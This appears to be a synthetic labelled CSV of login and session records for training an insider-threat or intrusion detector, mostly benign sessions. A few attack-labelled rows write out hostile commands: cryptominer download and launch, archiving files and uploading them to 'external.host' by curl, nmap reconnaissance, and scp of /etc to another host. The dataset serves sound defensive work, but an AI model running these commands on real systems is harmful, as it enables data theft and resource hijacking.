timestamp,entity_id,entity_type,login_hour,day_of_week,session_duration,command_length,unique_resources,failed_login_count,is_known_device,is_known_location,auth_method,source_ip,geo_location,device_fingerprint,resource_accessed,command_sequence,login_success,label
2024-07-22 15:29:16,user_0004,employee,8,0,3532,121,5,1,1,1,sso,10.185.16.151,"Singapore, SG",3b0638b0cf711a73665dc2f867310206,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-02-04 10:28:37,user_0035,contractor,16,2,2932,64,4,1,1,1,sso,10.20.206.128,"London, UK",f0eb464c3babf937d9a1ab0b7bfa9a67,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-10-10 20:08:07,user_0126,contractor,13,3,2813,140,4,1,1,1,sso,192.168.136.100,"Tokyo, JP",1af14c8a63ab7c77d94d120453c87ce9,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-05-07 08:46:08,user_0183,employee,14,2,1777,47,1,0,1,1,mfa,10.170.33.151,"Tokyo, JP",64eb62b66c8b9e19437518cc71570305,email_server,ls -la; cat report.txt; logout,1,Normal
2024-03-22 17:31:40,user_0020,contractor,14,3,975,84,2,0,1,1,mfa,10.203.167.189,"New York, US",8161248a5af24cbf4bd5406568e9ae53,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-07-09 16:52:21,user_0058,contractor,11,0,3124,81,1,0,1,1,sso,192.168.125.239,"Berlin, DE",9d4d9fadf8293ae898b8da4e1c7910c0,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-06-17 08:33:07,user_0183,admin,5,2,69568,364,0,0,1,0,password,159.61.232.151,"Mexico City, MX",177c45b51f47972dc662bdda85aa7e9e,crm_platform,wget miner.exe; chmod +x miner.exe; ./miner.exe --pool pool.minexmr.com,1,Cryptomining
2024-12-13 12:18:09,user_0011,contractor,16,0,328,66,3,0,1,1,sso,192.168.132.0,"Singapore, SG",819c4ae1b52eb63fcaf8746b278fb42f,email_server,ls -la; cat report.txt; logout,1,Normal
2024-03-31 09:58:20,user_0123,contractor,9,3,1108,45,5,0,1,1,sso,192.168.190.4,"Tokyo, JP",780385e81f5896cb7b85f14518f5f4e0,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-03-09 08:50:02,user_0157,contractor,13,3,318,162,2,0,1,1,password,172.30.51.113,"Singapore, SG",fcb61318475ba39c88d2b7b0f8594071,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-04-23 03:16:13,user_0078,employee,8,2,2648,141,2,1,1,1,mfa,192.168.30.201,"London, UK",2da4fd9edd0ab1e1af2beb1048ce4536,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-06-20 09:59:08,user_0152,employee,9,2,3102,173,1,0,1,1,mfa,172.20.201.226,"Singapore, SG",6ec6e7299295996600ea08148f7de22b,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-04-28 02:18:02,user_0078,employee,9,4,3443,146,4,0,1,1,mfa,192.168.178.116,"Tokyo, JP",761826007177fb5104a8e010e6f37a31,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-06-21 04:23:25,user_0187,employee,12,2,2272,71,1,1,1,1,sso,172.27.179.154,"Singapore, SG",c6e33b4b0471eec08adea248e355d215,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-04-11 16:09:56,user_0025,contractor,17,0,3206,97,4,0,1,1,sso,192.168.191.207,"London, UK",7e8930c439203e68fd1fcf332be77447,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-11-03 18:26:55,user_0197,employee,10,4,3013,60,3,1,1,1,sso,172.27.238.5,"Singapore, SG",bb7963ddc232484cf76ceb65e52f5128,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-09-17 01:53:17,user_0157,employee,8,0,1836,155,1,1,1,1,password,192.168.81.113,"Berlin, DE",046e01e7c3c0f14e9036732eb4f1c977,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-03-12 04:47:54,user_0191,contractor,8,0,2386,75,5,1,1,1,password,192.168.152.20,"Tokyo, JP",e4c123aaadcf6c1813ead71e939de74a,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-06-09 23:42:41,user_0073,employee,14,1,1973,57,1,1,1,1,mfa,192.168.100.243,"London, UK",86130a9276bd8e268aeaa0350512f50f,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-01-07 13:15:37,user_0077,employee,17,0,2474,103,3,0,1,1,mfa,172.17.128.253,"Berlin, DE",2f4dc1addda70250e9da1d47636dc50d,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-06-21 05:55:13,user_0057,contractor,15,1,1000,72,3,1,1,1,sso,10.0.124.133,"Singapore, SG",e3509960ab5afde355009610cb435685,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-06-16 07:05:15,user_0125,contractor,14,2,679,96,5,0,1,1,password,172.27.132.159,"London, UK",44ca3154ede047bd39fd1d8a18f0a4e9,email_server,ls -la; cat report.txt; logout,1,Normal
2025-05-05 04:36:42,user_0019,employee,11,0,428,104,1,0,1,1,mfa,172.23.232.91,"Tokyo, JP",b48362fdac1254c9faa61dbd106154ba,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-04-29 14:11:02,user_0065,contractor,16,4,931,190,2,0,1,1,sso,172.27.8.179,"Berlin, DE",b6a6e6443ff77d5905d21d79fdced51b,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-04-17 21:51:20,user_0001,contractor,12,3,3251,36,4,1,1,1,sso,10.224.130.77,"Singapore, SG",71781a2c63227fee3ba2c6b759480f01,email_server,ls -la; cat report.txt; logout,1,Normal
2024-07-31 17:49:06,user_0126,contractor,8,2,312,130,4,0,1,1,password,192.168.133.245,"New York, US",e90c5812bf5aa29194c317b81d4dbd91,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-06-18 18:52:56,user_0102,contractor,14,3,2640,60,3,1,1,1,sso,172.26.98.200,"New York, US",ac5edea8d13e473e8faf1498b13c5db8,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-06-21 17:17:01,user_0148,employee,1,6,228,795,14,8,0,0,password,171.9.79.54,"Mexico City, MX",cf97a53cebe6bdb8f7106d0fb7cf6165,backup_storage,nmap -sV 10.0.0.0/24; netstat -an; ifconfig; whoami,0,Recon Activity
2024-11-19 02:20:38,user_0076,employee,9,1,1726,99,3,1,1,1,password,172.20.235.48,"Singapore, SG",b2e13a60e118aa67a9bc3e01ab117792,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-10-21 07:12:21,user_0191,employee,17,3,2711,36,3,0,1,1,password,172.20.74.150,"Tokyo, JP",7bb6862b64d9b0664ba8708fc63eda89,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-06-07 02:56:50,user_0119,contractor,16,3,1240,83,4,1,1,1,password,192.168.95.4,"Berlin, DE",854a0ae1010aaba348e31503336a118a,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-04-10 01:24:12,user_0033,admin,4,1,46318,408,3,0,0,1,password,100.26.239.163,"Beijing, CN",2845f0ff42d8c3b7d1da07ff5d5fa51c,customer_data,wget miner.exe; chmod +x miner.exe; ./miner.exe --pool pool.minexmr.com,1,Cryptomining
2024-06-19 20:03:15,user_0114,employee,17,0,1453,193,3,1,1,1,mfa,192.168.233.224,"Singapore, SG",15f2dcb2ed82766058c2b091642d63eb,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-08-01 15:31:16,user_0080,contractor,12,4,2794,20,3,1,1,1,mfa,172.29.181.54,"New York, US",35f2e8332dfdf0a4c3852237cd9643f6,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-06-05 20:32:34,user_0200,vendor,2,6,1710,97,7,0,1,1,mfa,172.23.190.194,"Beijing, CN",2d6227415336c4e3d8deed008864a430,financial_db,ls -la; cat report.txt; logout,1,Off-Hours Access
2024-04-12 03:50:07,user_0065,employee,14,3,1423,190,3,1,1,1,sso,172.27.28.209,"Tokyo, JP",4fda9aebdf8a645bcc7574cc6dde9054,email_server,ls -la; cat report.txt; logout,1,Normal
2024-04-06 15:31:47,user_0065,contractor,16,3,313,37,2,1,1,1,mfa,172.22.245.30,"Tokyo, JP",65ad2195016c3021aa326341561e07ec,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-01-22 23:40:38,user_0001,contractor,16,1,2292,194,5,0,1,1,mfa,192.168.69.148,"London, UK",5eef7b029340cf84ef37cd2a7eb09c94,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-01-26 08:27:03,user_0075,employee,12,2,3179,136,1,0,1,1,mfa,172.26.225.36,"Singapore, SG",b24e8b50c1118148dbfd485d50b729f3,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-01-19 06:10:35,user_0049,employee,8,2,795,73,2,0,1,1,password,10.143.167.64,"Berlin, DE",d6d5f5dd103fb18b993f7216a1cced2c,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-10-02 16:55:38,user_0178,employee,17,2,3311,48,4,0,1,1,password,172.31.5.192,"London, UK",ce3db81936630bb31e32f58c7ce522f3,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-09-10 07:26:39,user_0142,contractor,16,3,350,199,5,1,1,1,password,192.168.93.233,"Tokyo, JP",298dab548f84a796145aa4dc4a80b8db,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-01-05 11:29:50,user_0028,employee,15,2,1962,158,1,1,1,1,password,10.195.99.94,"Singapore, SG",70d1cad2fd296e45d823f32353d26ef4,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-07-08 05:51:52,user_0113,employee,10,0,3540,181,5,1,1,1,password,172.22.24.105,"New York, US",58ed0eb8c0867e44ee59af0f246648b8,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-06-02 18:29:06,user_0149,employee,13,0,768,86,5,1,1,1,sso,172.29.162.168,"Singapore, SG",125c54dd8e8ce1c0cc8cb04cfdde2d18,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-01-02 19:33:40,user_0200,contractor,16,2,757,65,4,1,1,1,sso,10.228.41.136,"New York, US",4385357fe98d7bce9752a5b57b1bb5d6,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-01-16 07:47:37,user_0136,contractor,17,2,574,135,4,0,1,1,mfa,172.25.217.109,"London, UK",dc6fc3e40f138411b01579f43335fc0e,email_server,ls -la; cat report.txt; logout,1,Normal
2024-10-06 20:47:39,user_0024,contractor,13,0,1990,107,1,1,1,1,mfa,192.168.170.207,"Singapore, SG",654914a1d5df227cd96e8b99ffdf1857,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-08-14 16:48:23,user_0130,employee,12,4,1683,176,5,0,1,1,sso,192.168.186.35,"New York, US",561e958acc0631ca328f6c469abe8076,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-02-29 07:15:55,user_0027,contractor,9,2,2279,33,1,0,1,1,password,192.168.64.25,"Berlin, DE",daf30e302d3a9aa526abcb6342b83c98,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-08-30 08:13:49,user_0154,contractor,11,4,1968,94,4,0,1,1,password,172.24.203.234,"Tokyo, JP",79fdf749c97ecf566052b677ed9a0993,email_server,ls -la; cat report.txt; logout,1,Normal
2024-09-08 21:04:05,user_0176,employee,11,0,3597,100,4,1,1,1,password,192.168.232.75,"London, UK",aeac6b347675dd3e1efdd37848fb9712,email_server,ls -la; cat report.txt; logout,1,Normal
2024-12-16 15:02:09,user_0111,contractor,18,3,1152,113,3,1,1,1,password,192.168.29.23,"London, UK",70b9f7c695f6c37ce1b5ca049a005b36,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-04-17 01:52:48,user_0123,service_account,1,1,1640,89,4,0,1,1,mfa,10.228.182.21,"Mumbai, IN",9387a4bb036a0600f1ef83106726b7ab,customer_data,ls -la; cat report.txt; logout,1,Off-Hours Access
2025-01-22 02:46:12,user_0080,contractor,15,0,1652,40,2,0,1,1,mfa,192.168.149.131,"Tokyo, JP",f994dc493fdc44f3bd16f846a87027dc,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-03-22 00:50:27,user_0170,contractor,17,2,2603,106,2,1,1,1,password,10.171.154.243,"New York, US",b1535d1d655198b34d7b36051ced50bd,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-08-05 10:18:20,user_0108,employee,9,1,896,86,5,1,1,1,password,172.20.165.96,"Singapore, SG",2502530f9f213237c78b3ab3f8ebcdb5,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-02-15 22:33:54,user_0143,contractor,9,1,307,155,1,0,1,1,mfa,10.44.110.88,"Tokyo, JP",43e4bb38212e2c30814f4dce0ff88d71,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-02-06 11:21:58,user_0046,contractor,14,3,3095,90,5,1,1,1,mfa,192.168.236.127,"Tokyo, JP",fa8c02b4c96bf9f6c26ce737d77cbf8c,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-01-17 12:33:51,user_0076,contractor,17,4,3545,69,2,0,1,1,password,10.251.83.238,"London, UK",207295d98f22d52f94817ea4e9776e8d,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-04-22 07:13:55,user_0072,contractor,17,2,157366,361,7,2,0,1,vpn,159.113.47.70,"Beijing, CN",53ab92ceb39f3985656a574e070dc71d,devops_pipeline,ssh admin@192.168.1.50; sudo su; scp -r /etc root@10.0.0.2:/tmp,1,Session Hijacking
2024-01-04 20:26:33,user_0142,contractor,11,2,1522,80,4,0,1,1,mfa,10.2.186.123,"New York, US",c6ada5c47f1f2e3de5065902c05cd729,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-05-21 23:12:32,user_0081,contractor,14,1,523,115,4,0,1,1,mfa,172.18.164.35,"New York, US",93817ef655e661c5e58eb0e0759cda0e,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-01-27 00:40:37,user_0189,employee,15,0,2434,190,2,1,1,1,mfa,192.168.87.41,"Berlin, DE",b3417e19550d216ea316f1785a10e5a4,email_server,ls -la; cat report.txt; logout,1,Normal
2025-04-12 19:27:20,user_0140,service_account,23,4,3707,1054,16,0,1,1,api_key,10.137.244.143,"Cape Town, ZA",2f084c0f277f78771fd7b0a18683d571,backup_storage,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Data Exfiltration
2024-03-07 00:13:25,user_0025,contractor,18,4,1489,93,2,1,1,1,mfa,192.168.194.110,"Berlin, DE",1de6668184d9859f334695e368baf0ad,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-09-02 17:48:54,user_0037,employee,9,3,1662,181,2,1,1,1,sso,10.139.182.133,"New York, US",36b6a0edaed4a3fb6888b6645115c6db,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-09-18 04:46:53,user_0017,contractor,18,2,1434,86,3,0,1,1,password,172.23.113.0,"Singapore, SG",5d3ec1eeb4dc51294d49f75ca5a76fbd,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-04-09 15:21:21,user_0014,employee,8,3,3442,71,2,1,1,1,password,192.168.235.54,"London, UK",d8757736cfff4f76e1b8763ea8f0fc56,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-10-16 05:49:20,user_0084,employee,14,3,331,32,1,1,1,1,password,10.7.14.17,"Berlin, DE",144e199db652986982b89c680d3eb51e,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-07-02 14:44:48,user_0080,contractor,11,4,625,35,2,1,1,1,mfa,192.168.250.81,"Berlin, DE",f2b517eb30acf6dd8b5df842d2b65147,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-05-24 02:23:02,user_0037,contractor,8,2,3142,185,2,0,1,1,mfa,172.25.187.170,"New York, US",0b372b7084f418388b309e4fe818150e,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-08-25 00:17:17,user_0093,employee,18,2,3319,115,1,1,1,1,password,192.168.30.178,"Singapore, SG",9488b59e84aca6bcb43528b9fe373d6d,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-09-10 05:44:22,user_0051,employee,12,4,1401,150,4,1,1,1,mfa,172.18.127.158,"New York, US",a236be6c8bebf725cfa1d0facc54f541,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-02-06 00:36:39,user_0199,employee,15,0,2753,59,4,1,1,1,password,192.168.175.87,"Tokyo, JP",9110e00d0965ab081d431f8aee830b42,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-10-28 18:13:08,user_0042,contractor,12,1,793,96,4,1,1,1,sso,10.229.121.178,"Berlin, DE",aae2543d411c5d033bde68bc0d0ff955,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-05-25 17:19:15,user_0138,employee,13,1,1011,28,5,0,1,1,sso,10.149.101.69,"New York, US",fd9acecfe81a11033ebe92d7282bd4a0,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-05-19 11:34:42,user_0064,contractor,15,3,2999,66,5,0,1,1,mfa,10.111.192.53,"New York, US",8cadbad13cab8d63deb625c82e053800,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-03-03 09:11:09,user_0167,contractor,18,4,1856,101,4,0,1,1,sso,192.168.171.161,"New York, US",c1cad15f3f32d156e8540a32a5a418be,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-04 03:06:35,user_0046,employee,17,2,2498,52,2,0,1,1,sso,192.168.105.89,"London, UK",97d1e2d11cef7c2434914ad97969d84c,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-09-27 02:54:02,user_0168,employee,10,4,1909,155,2,0,1,1,password,10.46.121.24,"New York, US",b2b122bd3d9361b60c229236a4fb7058,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-01-21 20:30:39,user_0185,employee,12,0,461,28,2,0,1,1,sso,10.208.94.213,"Tokyo, JP",eaff36b8a4dfee11156f3a5811d990fd,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-02-01 06:24:21,user_0129,employee,8,1,3222,105,4,1,1,1,password,172.27.139.221,"Singapore, SG",cc7111aa6af0e1accd1dbb28b2f5924a,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-05-25 15:11:14,user_0143,contractor,8,1,908,33,2,0,1,1,password,10.64.162.162,"Tokyo, JP",fe632ff4fc41013da6be024914e7e546,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-09-09 05:17:39,user_0142,employee,10,4,3038,98,2,1,1,1,password,10.94.146.4,"Berlin, DE",b5eabdf2112fc07e1013a201500d2fcf,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-05-08 10:11:59,user_0102,contractor,8,1,1120,64,3,1,1,1,password,172.26.74.53,"London, UK",506b2958011ac531d482b38c6068b96f,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-06-18 15:59:28,user_0135,employee,16,0,3318,54,2,0,1,1,password,192.168.94.167,"London, UK",250cac07f14ae48c6b90f0c2f60bcbf2,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-12-13 19:54:27,user_0147,contractor,13,4,2289,185,5,0,1,1,password,192.168.204.46,"Singapore, SG",38a328ea3706647898d9f85770bb1e56,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-01-01 15:48:07,user_0074,contractor,17,0,2064,67,3,1,1,1,mfa,172.17.193.238,"Berlin, DE",c72a1be5a45858c4244db41914d57291,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-10-10 18:55:55,user_0188,employee,9,2,3144,139,5,0,1,1,mfa,192.168.67.100,"Tokyo, JP",aefa129d126e7a27f82625eb6f1ad4ef,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-10-14 20:47:44,user_0133,contractor,14,0,1277,21,5,1,1,1,password,10.94.223.21,"New York, US",52a933defcf8b5bfdba59eab0ca39bae,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-06-07 03:03:51,user_0069,employee,9,4,2402,182,1,1,1,1,sso,192.168.234.166,"Singapore, SG",8105d8084cfe6ca5bfcd41636da1b15c,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-04-28 16:17:45,user_0190,employee,15,2,2723,146,2,0,1,1,password,172.24.137.64,"New York, US",71e2a3de99ec3f11ad2a8599b9c299d8,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-05-18 12:51:07,user_0131,contractor,10,2,465,199,5,1,1,1,password,172.30.227.164,"New York, US",1a694e9ad14a0a48fb4f0a7117922c72,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-02-21 12:23:25,user_0063,contractor,16,3,471,20,4,1,1,1,sso,10.114.204.179,"London, UK",88e1cd9fcfc53eccc8258191c622ed8b,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-09-07 06:30:15,user_0100,contractor,11,0,449,135,2,0,1,1,sso,172.25.103.144,"Berlin, DE",e22664be98a148738e6a0117f499e607,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-06-25 04:13:08,user_0114,employee,18,4,2925,189,1,1,1,1,sso,10.100.213.164,"Berlin, DE",3a9039a9475ad9bd8256cda1e14dee0f,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-01-04 07:17:28,user_0043,employee,13,0,513,55,5,1,1,1,mfa,172.18.185.86,"Tokyo, JP",5c771c603e669a740dc7676640ce4be3,email_server,ls -la; cat report.txt; logout,1,Normal
2025-01-17 04:04:58,user_0108,employee,10,2,681,31,2,1,1,1,sso,172.31.121.153,"Berlin, DE",acc07aeaaaeeeabaf50b43940c3448dd,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-12-16 20:46:54,user_0045,contractor,10,0,1489,173,3,1,1,1,password,192.168.208.214,"London, UK",cdd43078936faf113cb9e72411729cd0,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-04-16 21:58:47,user_0037,contractor,8,1,575,80,3,1,1,1,mfa,10.113.197.99,"Singapore, SG",a34868ebf5b09651120070b48a7ac105,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-05-16 00:15:11,user_0145,contractor,13,3,733,22,1,1,1,1,password,10.235.108.191,"Singapore, SG",e033f2f181cbcc1e1132e5203b56b64a,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-04-09 03:46:36,user_0152,contractor,18,4,2081,154,5,1,1,1,mfa,172.31.113.222,"Tokyo, JP",dd3d64b8b046044344761cc71ba6c86b,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-07-10 22:56:09,user_0075,employee,17,2,1369,84,5,1,1,1,sso,172.25.242.47,"New York, US",8fc2f11c869d6d31b57f41359a781551,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-01-27 16:09:18,user_0117,contractor,9,0,2981,186,5,0,1,1,mfa,10.36.7.34,"Tokyo, JP",64108e5c2999637666cc27bb6996f318,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-02-01 10:08:58,user_0087,contractor,18,3,3000,40,3,0,1,1,password,10.217.169.253,"Singapore, SG",58b21fd45af7adfb5d1385708d293509,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-11-13 13:49:55,user_0074,employee,10,3,1833,117,4,1,1,1,mfa,172.23.110.153,"New York, US",3986fab8049967762fb56de91496201d,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-03-10 23:23:21,user_0062,employee,14,0,1895,158,3,0,1,1,mfa,172.25.215.77,"New York, US",5c03cdecb10cb8c5051ffe8784b02984,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-06-10 06:37:11,user_0198,contractor,12,3,1385,50,1,0,1,1,sso,10.92.138.157,"Berlin, DE",4a82f70ef6ae2d014f4fd62bd8661d18,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-03-29 07:59:31,user_0027,contractor,10,1,3257,144,4,1,1,1,mfa,10.166.156.175,"Singapore, SG",672af8a1599ad7b75798e7ce62befb11,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-04-18 03:08:59,user_0011,contractor,16,2,674,68,1,0,1,1,sso,192.168.157.229,"Berlin, DE",6708e63f114d35371c53a46b15b0300a,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-04-02 22:09:36,user_0186,employee,10,0,2731,171,3,1,1,1,mfa,192.168.181.158,"Berlin, DE",8b28b1f4382af675c8836eab4e7838bd,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-02-26 04:25:00,user_0053,contractor,8,0,1626,143,1,0,1,1,mfa,172.18.63.21,"New York, US",55d3121f0a7e7b8c66959efe620457e4,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-09-07 04:35:58,user_0021,employee,9,1,1426,179,5,1,1,1,mfa,192.168.136.3,"Singapore, SG",035b7f13d7561447861e4e6fbf4a618a,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-02-02 17:35:19,user_0116,employee,14,0,1209,135,3,0,1,1,mfa,172.23.6.158,"New York, US",bfea09d6cac6dd24d8cf7ebf1ac01986,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-06-06 23:14:12,user_0107,employee,8,3,433,23,1,0,1,1,mfa,192.168.127.110,"Singapore, SG",d51be1555a8c1e81071e780b7661540e,email_server,ls -la; cat report.txt; logout,1,Normal
